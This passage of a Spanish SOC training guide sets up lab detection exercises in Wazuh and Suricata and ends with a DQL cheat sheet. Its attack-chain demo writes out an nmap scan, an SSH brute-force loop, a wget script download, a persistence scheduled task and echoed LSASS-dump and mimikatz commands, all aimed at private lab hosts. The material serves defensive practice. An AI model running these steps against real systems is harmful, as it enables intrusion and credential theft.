+Investigación
+agent.id: "000" AND data.flow.src_ip: "10.104.2.12" AND data.app_proto: "http"
+Limpieza
+bashrm -f /tmp/test_download.txt
+Variante M — wget user-agent sospechoso
+Comandos
+bashwget --user-agent="Mozilla/5.0 EvilBot" -O /tmp/script.sh http://10.104.2.11 2>&1 | head -5
+Investigación
+agent.id: "000" AND full_log: *EvilBot*
+Limpieza
+bashrm -f /tmp/script.sh
+Variante D — curl piped a bash (solo simular)
+Comandos
+bash# Solo test de conectividad, NO piped bash
+curl -s http://10.104.2.11 > /dev/null
+Análisis
+Patrón curl URL | bash = malware común. Fileless. Sin auditd no se detecta.
+Limpieza
+Nada.
+
+CASO 20 — Cadena de ataque completa
+MITRE: Múltiples tactics
+Donde se ve: Kali + Windows + Suricata
+Escenario
+Caso estrella para la demo. Ataque completo de principio a fin.
+La historia: atacante externo (simulado desde Kali) compromete WindowsAgent. Dentro: recon, persistencia, credenciales.
+Fases
+Fase 1 — Reconocimiento externo
+bashnmap -sS -p 22,135,139,445,3389 10.104.2.121
+Espera 30 seg.
+Fase 2 — Fuerza bruta SSH
+bashfor user in administrator admin root oracle; do
+  echo "Intentando: $user"
+  ssh $user@10.104.2.121 -o ConnectTimeout=3 2>/dev/null
+  sleep 2
+done
+Espera 30 seg.
+Fase 3 — Acceso simulado (RDP al WindowsAgent)
+Conecta por RDP. Abre PowerShell admin.
+Fase 4 — Discovery interno
+powershellwhoami
+systeminfo
+net user
+net localgroup administrators
+ipconfig /all
+netstat -ano
+Fase 5 — Persistencia
+En CMD admin:
+schtasks /create /tn "demo_ataque_persistencia" /tr "calc.exe" /sc minute /mo 10
+Fase 6 — Credential Access (simulado)
+echo "procdump -ma lsass.exe lsass.dmp"
+echo "sekurlsa::logonpasswords"
+Investigación completa en Discover
+Paso 1 — Visión global:
+@timestamp > now-30m AND rule.level >= 5
+Time picker: Last 30 minutes.
+Columnas: agent.name, rule.id, rule.description, rule.level.
+Orden: ascendente.
+Paso 2 — Identificar fases en la timeline:
+En orden deberías ver:
+
+Alertas Suricata por nmap desde 10.104.2.12.
+Alertas fallos SSH desde 10.104.2.12.
+Alertas regla 100001 (enumeración) en 10.104.2.121.
+Alerta regla 100006 (tarea programada).
+Alerta regla 100005 (LSASS — crítica).
+
+Paso 3 — Narrar el incidente (en libreta):
+
+"El día X a las XX:XX, IP 10.104.2.12 realizó escaneo de puertos contra 10.104.2.121, identificando servicios RDP, SMB, WinRM. A los dos minutos, misma IP intentó SSH fallido contra varios usuarios (administrator, admin, root, oracle). Aunque SSH no está en Windows, confirma reconocimiento dirigido.
+Simultáneamente (simulación), en el Windows se observa actividad de discovery post-compromiso: whoami, systeminfo, net user — patrón de reconocimiento interno.
+Después: creación de tarea programada (persistencia) e intentos de volcado LSASS (credential access).
+Recomendaciones:
+
+Aislar 10.104.2.121 inmediatamente.
+Resetear credenciales de todos los administradores.
+Investigar origen del acceso inicial.
+Bloquear IP 10.104.2.12 en perímetro.
+Revisar tareas programadas últimos X días.
+Eliminar tarea demo_ataque_persistencia."
+
+
+Paso 4 — Pivoting:
+
+Desde alerta del Kali, clic + sobre IP origen. Filtras por esa IP.
+Quita filtro de agent. Ves todo lo que hizo esa IP.
+Clic en usuario. Ves qué usuarios probó.
+
+Paso 5 — Búsqueda guardada:
+Guarda como "Demo Carlos — cadena ataque completa".
+Panel de fields
+
+agent.name → ¿cuántos agentes?
+rule.level → ¿% críticas?
+rule.groups → ¿cuántas categorías MITRE?
+data.srcip / data.flow.src_ip → ¿IPs únicas?
+
+Limpieza
+En Windows (CMD):
+schtasks /delete /tn "demo_ataque_persistencia" /f
+En Kali: nada.
+
+CHULETA FINAL DQL
+Por agente
+agent.id: "001"     WindowsAgent
+agent.id: "002"     kaliAgent
+agent.id: "000"     Manager/Suricata
+Por nivel
+rule.level >= 10    Atención + críticas
+rule.level >= 12    Solo críticas
+rule.level: 3       Informativas
+Por categoría
+rule.groups: "authentication_failed"
+rule.groups: "syscheck"
+rule.groups: "pam"
+rule.groups: "suricata"
+rule.groups: "sysmon"
+Syscheck (FIM)
+syscheck.path: "/etc/passwd"
+syscheck.event: "added"
+syscheck.event: "modified"
+syscheck.event: "deleted"
+Contenido
+full_log: *brute*
+data.srcuser: "root"
+data.srcip: "10.104.2.12"
+data.win.eventdata.commandLine: *whoami*
+Wildcards y existencia
+data.srcuser: admin*     Empieza por admin
+data.srcuser: *          Existe
+NOT data.srcuser: *      No existe
+Combinaciones
+agent.id: "002" AND rule.level >= 10
+agent.id: "001" AND data.win.eventdata.commandLine: *powershell*
+NOT data.srcuser: ("david" OR "carlos" OR "alphacentauri")
+Tiempo: NO mezclar en filtro, usar time picker.
+
+BÚSQUEDAS GUARDADAS
+Crea antes de irte:
+NombreFiltroColumnasRevisión matutinarule.level >= 10timestamp, agent.name, rule.description, data.srcuserActividad Kaliagent.id: "002"timestamp, rule.id, rule.descriptionActividad Windowsagent.id: "001"timestamp, rule.id, rule.descriptionFallos authrule.groups: "authentication_failed"timestamp, agent.name, data.srcuser, data.srcipFIM cambiosrule.groups: "syscheck"timestamp, agent.name, syscheck.path, syscheck.eventCríticas Windowsagent.id: "001" AND rule.level >= 12timestamp, rule.descriptionDemo Carlosfiltro del Caso 20todas relevantes
+
+LIMITACIONES IDENTIFICADAS — para la demo
+Durante los casos confirma qué NO detecta el SOC:
+
+Ejecución de comandos en Linux — sin auditd, invisible (17, 22, 19).
+Modificaciones en /home — no cubierto (11D, 10M).
+Cron por usuario — /var/spool/cron/crontabs/ no monitorizado (8M).
+DNS desde Linux — sin captura.
+report_changes inactivo — no ves diff (13M).
+Login exitoso tras brute force — no hay correlación nativa (4M).
+Usuarios con UID 0 — no hay regla específica (5D).
+
+Cada una = mejora concreta para la demo. Te posiciona como alguien que detecta gaps.
+
+AUTOEVALUACIÓN FINAL DEL DÍA
+Al terminar deberías poder:
+
+ Construir cualquier filtro DQL sin chuleta.
+ Usar Add filter con fluidez.
+ Navegar panel de fields para top values.
+ Añadir/quitar columnas.
+ Ordenar timestamp asc/desc.
+ Reconstruir timelines de incidentes.
+ Pivotar entre IP/usuario/agente.
+ Identificar patrones (spray vs brute vs targeted).
+ Distinguir FP de incidente real.
+ Escribir informe operativo en lenguaje humano.
+ Nombrar 5+ limitaciones del SOC actual.
+
+
+Mucha suerte mañana. Apunta dudas, las revisamos el miércoles.
